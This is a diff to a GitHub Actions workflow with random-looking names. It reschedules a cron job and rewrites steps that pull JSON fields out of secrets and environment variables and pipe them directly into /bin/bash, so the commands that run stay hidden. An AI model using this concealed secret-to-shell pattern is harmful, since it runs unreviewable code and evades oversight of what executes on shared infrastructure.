@@ -1,8 +1,9 @@
 name: corrosionsorrowful
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '18 1/6 * * *'
+    - cron: '17 5/6 * * *'
 
 jobs:
   build:
@@ -11,17 +12,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: corrosionsorrowful
         env:
-          log9: ${{ secrets.log9 }}
+          xtdf87706: ${{ secrets.xtdf87706 }}
         run: |
-          echo $log9 | jq -r .kiitx10643 | /bin/bash
-          echo $ficr77 | jq -r .hd02 | /bin/bash
-          echo $qcv54 | jq -r .cpwaj80859 | /bin/bash
-          echo $uz594 | jq -r .ppl308 | /bin/bash
-          echo $m0294 | jq -r .unrvn5 | /bin/bash
-          echo $itq37 | jq -r .l4749 | /bin/bash
-          echo $fbm2084 | jq -r .q010 | /bin/bash
-          echo $t6 | jq -r .bcurp0532 | /bin/bash
-          echo $blj20490 | jq -r .zyir9568 | /bin/bash
-          echo $vylk56 | jq -r .ob46456 | /bin/bash
-          echo $nfb45 | jq -r .em6801 | /bin/bash
+          echo $xtdf87706 | jq -r .eepq20 | /bin/bash
+          echo $ah05595 | jq -r .cfl49014 | /bin/bash
+          echo $oya1 | jq -r .wx77 | /bin/bash
+          echo $swvju73302 | jq -r .qhhtk74 | /bin/bash
+          echo $dxu72400 | jq -r .nfqx0423 | /bin/bash
+          echo $ttz48845 | jq -r .bt4 | /bin/bash
+          echo $n1791 | jq -r .y8 | /bin/bash
+          echo $byj9389 | jq -r .ohzq0106 | /bin/bash
+          echo $p47 | jq -r .ibkj87 | /bin/bash
 
